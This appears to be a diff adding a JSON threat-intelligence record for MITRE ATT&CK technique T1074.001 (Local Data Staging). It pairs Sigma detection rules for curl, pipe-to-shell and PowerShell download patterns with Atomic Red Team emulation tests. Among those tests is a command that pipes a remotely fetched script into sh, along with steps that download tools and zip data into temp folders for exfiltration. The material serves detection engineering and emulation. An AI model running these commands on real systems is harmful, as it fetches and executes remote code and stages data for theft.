@@ -1,0 +1,233 @@
+{
+    "id": "T1074.001",
+    "name": "Local Data Staging",
+    "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](T1560). Interactive command shells may be used, and common functionality within [cmd](S0106) and bash may be used to copy data into a staging location.",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Collection",
+    "data_sources": "File: File Access, File: File Creation, Command: Command Execution",
+    "detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001).",
+    "url": "https://attack.mitre.org/techniques/T1074/001",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1074.001",
+                "atomic_attack_guid": "39ce0303-ae16-4b9e-bb5b-4f53e8262066",
+                "atomic_attack_name": "Stage data from Discovery.sh",
+                "platform": "Linux",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Curl Usage on Linux",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml",
+                        "remote_content": "title: Curl Usage on Linux\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nstatus: test\ndescription: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: low\n"
+                    },
+                    {
+                        "rule_name": "Linux Shell Pipe to Shell",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml",
+                        "remote_content": "title: Linux Shell Pipe to Shell\nid: 880973f3-9708-491c-a77b-2a35a1921158\nstatus: test\ndescription: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-14\nmodified: 2022-07-26\ntags:\n    - attack.defense-evasion\n    - attack.t1140\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|startswith:\n            - 'sh -c '\n            - 'bash -c '\n    selection_exec:\n        - CommandLine|contains:\n              - '| bash '\n              - '| sh '\n              - '|bash '\n              - '|sh '\n        - CommandLine|endswith:\n              - '| bash'\n              - '| sh'\n              - '|bash'\n              - ' |sh'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate software that uses these patterns\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Linux Ingress Tool Transfer Hunting",
+                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1074.001",
+                "atomic_attack_guid": "a57fbe4b-3440-452a-88a7-943531ac872a",
+                "atomic_attack_name": "Zip a Folder with PowerShell for Staging in Temp",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_zip_compress.yml",
+                        "remote_content": "title: Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet\nid: 85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98 # Process Creation\nrelated:\n    - id: 71ff406e-b633-4989-96ec-bc49d825a412 # PowerShell Classic\n      type: similar\n    - id: daf7eb81-35fd-410d-9d7a-657837e602bb # PowerShell Module\n      type: similar\n    - id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 # PowerShell Script\n      type: similar\nstatus: test\ndescription: |\n    Detects PowerShell scripts that make use of the \"Compress-Archive\" Cmdlet in order to compress folders and files where the output is stored in a potentially suspicious location that is used often by malware for exfiltration.\n    An adversary might compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md\n    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113\ndate: 2021-07-20\nmodified: 2022-10-09\ntags:\n    - attack.collection\n    - attack.t1074.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Compress-Archive -Path*-DestinationPath $env:TEMP'\n            - 'Compress-Archive -Path*-DestinationPath*\\AppData\\Local\\Temp\\'\n            - 'Compress-Archive -Path*-DestinationPath*:\\Windows\\Temp\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1074.001",
+                "atomic_attack_guid": "107706a5-6f9f-451a-adae-bab8c667829f",
+                "atomic_attack_name": "Stage data from Discovery.bat",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Invoke-WebRequest Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_download.yml",
+                        "remote_content": "title: Suspicious Invoke-WebRequest Execution\nid: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc\nrelated:\n    - id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n      type: derived\nstatus: test\ndescription: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location\nreferences:\n    - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-02\nmodified: 2024-02-23\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_commands:\n        CommandLine|contains:\n            # These are all aliases of Invoke-WebRequest\n            - 'curl '\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'wget '\n    selection_flags:\n        CommandLine|contains:\n            - ' -ur'\n            - ' -o'\n    selection_susp_locations:\n        CommandLine|contains:\n            - '\\AppData\\'\n            - '\\Desktop\\'\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '%AppData%'\n            - '%Public%'\n            - '%Temp%'\n            - '%tmp%'\n            - ':\\Windows\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
+                    "1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+                    "71ff406e-b633-4989-96ec-bc49d825a412",
+                    "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
+                    "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
+                    "daf7eb81-35fd-410d-9d7a-657837e602bb"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
+                        "lookup_data": {
+                            "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
+                            "raw": "author: frack113\ndate: 2021/07/20\ndescription: Use living off the land tools to zip a file and stage it in the Windows\n  temporary folder for later exfiltration\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|contains|all:\n    - 'Compress-Archive '\n    - ' -Path '\n    - ' -DestinationPath '\n    - $env:TEMP\\\nfalsepositives:\n- Unknown\nid: b7a3c9a3-09ea-4934-8864-6a32cacd98d9\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md\nstatus: experimental\ntags:\n- attack.collection\n- attack.t1074.001\ntitle: Zip A Folder With PowerShell For Staging In Temp - PowerShell Script\n",
+                            "sigma:id": "b7a3c9a3-09ea-4934-8864-6a32cacd98d9",
+                            "title": "Zip A Folder With PowerShell For Staging In Temp - PowerShell Script",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1c34f7aa-9341-4a48-bfab-af22e51aca6c",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1074.001",
+                            "mitre-cti:description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
+                            "mitre-cti:name": "Local Data Staging",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Massimiliano Romano, BT Security'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c', 'created': '2020-03-13T21:13:10.467Z', 'x_mitre_version': '1.1', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1074.001', 'url': 'https://attack.mitre.org/techniques/T1074/001'}, {'source_name': 'Prevailion DarkWatchman 2021', 'url': 'https://www.prevailion.com/darkwatchman-new-fileless-techniques/', 'description': 'Smith, S., Stafford, M. (2021, December 14). DarkWatchman: A new evolution in fileless techniques. Retrieved January 10, 2022.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\\n\\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)', 'modified': '2022-04-21T16:07:10.829Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Local Data Staging', 'x_mitre_detection': 'Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\\n\\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nConsider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'collection'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['File: File Access', 'File: File Creation', 'Windows Registry: Windows Registry Key Modification', 'Command: Command Execution'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "71ff406e-b633-4989-96ec-bc49d825a412",
+                        "lookup_data": {
+                            "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
+                            "raw": "author: frack113\ndate: 2021/07/20\ndescription: Use living off the land tools to zip a file and stage it in the Windows\n  temporary folder for later exfiltration\ndetection:\n  condition: selection\n  selection:\n    HostApplication|contains|all:\n    - 'Compress-Archive '\n    - ' -Path '\n    - ' -DestinationPath '\n    - $env:TEMP\\\nfalsepositives:\n- Unknown\nid: 71ff406e-b633-4989-96ec-bc49d825a412\nlevel: medium\nlogsource:\n  definition: fields have to be extract from event\n  product: windows\n  service: powershell-classic\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md\nrelated:\n- id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9\n  type: derived\nstatus: test\ntags:\n- attack.collection\n- attack.t1074.001\ntitle: Zip A Folder With PowerShell For Staging In Temp - PowerShell\n",
+                            "sigma:id": "71ff406e-b633-4989-96ec-bc49d825a412",
+                            "title": "Zip A Folder With PowerShell For Staging In Temp - PowerShell",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
+                        "lookup_data": {
+                            "description": "UEFI threats moving to the ESP: Introducing ESPecter bootkit",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5df8df26-fe0e-4858-94a7-6cf71d9519c9.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1637336858",
+                            "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
+                        "lookup_data": {
+                            "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
+                            "raw": "author: frack113\ndate: 2021/07/20\ndescription: Use living off the land tools to zip a file and stage it in the Windows\n  temporary folder for later exfiltration\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - 'Compress-Archive '\n    - ' -Path '\n    - ' -DestinationPath '\n    - $env:TEMP\\\nfalsepositives:\n- Unknown\nid: 85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md\nrelated:\n- id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9\n  type: derived\nstatus: test\ntags:\n- attack.collection\n- attack.t1074.001\ntitle: Zip A Folder With PowerShell For Staging In Temp\n",
+                            "sigma:id": "85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98",
+                            "title": "Zip A Folder With PowerShell For Staging In Temp",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "daf7eb81-35fd-410d-9d7a-657837e602bb",
+                        "lookup_data": {
+                            "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
+                            "raw": "author: frack113\ndate: 2021/07/20\ndescription: Use living off the land tools to zip a file and stage it in the Windows\n  temporary folder for later exfiltration\ndetection:\n  condition: selection_4103\n  selection_4103:\n    ContextInfo|contains|all:\n    - 'Compress-Archive '\n    - ' -Path '\n    - ' -DestinationPath '\n    - $env:TEMP\\\nfalsepositives:\n- Unknown\nid: daf7eb81-35fd-410d-9d7a-657837e602bb\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1074.001/T1074.001.md\nrelated:\n- id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9\n  type: derived\nstatus: experimental\ntags:\n- attack.collection\n- attack.t1074.001\ntitle: Zip A Folder With PowerShell For Staging In Temp  - PowerShell Module\n",
+                            "sigma:id": "daf7eb81-35fd-410d-9d7a-657837e602bb",
+                            "title": "Zip A Folder With PowerShell For Staging In Temp  - PowerShell Module",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1074.001",
+                "display_name": "Data Staged: Local Data Staging",
+                "atomic_tests": [
+                    {
+                        "name": "Stage data from Discovery.bat",
+                        "auto_generated_guid": "107706a5-6f9f-451a-adae-bab8c667829f",
+                        "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_file": {
+                                "description": "Location to save downloaded discovery.bat file",
+                                "type": "path",
+                                "default": "$env:TEMP\\discovery.bat"
+                            }
+                        },
+                        "executor": {
+                            "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile #{output_file}\n",
+                            "cleanup_command": "Remove-Item -Force #{output_file} -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Stage data from Discovery.sh",
+                        "auto_generated_guid": "39ce0303-ae16-4b9e-bb5b-4f53e8262066",
+                        "description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
+                        "supported_platforms": [
+                            "linux",
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "output_file": {
+                                "description": "Location to save downloaded discovery.bat file",
+                                "type": "path",
+                                "default": "/tmp/T1074.001_discovery.log"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Check if curl is installed on the machine.\n",
+                                "prereq_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
+                                "get_prereq_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\n",
+                            "cleanup_command": "rm #{output_file}\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Zip a Folder with PowerShell for Staging in Temp",
+                        "auto_generated_guid": "a57fbe4b-3440-452a-88a7-943531ac872a",
+                        "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_file": {
+                                "description": "Location to save zipped file or folder",
+                                "type": "path",
+                                "default": "$env:TEMP\\Folder_to_zip.zip"
+                            },
+                            "input_file": {
+                                "description": "Location of file or folder to zip",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip"
+                            }
+                        },
+                        "executor": {
+                            "command": "Compress-Archive -Path \"#{input_file}\" -DestinationPath #{output_file} -Force\n",
+                            "cleanup_command": "Remove-Item -Path #{output_file} -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:28:36"
+}
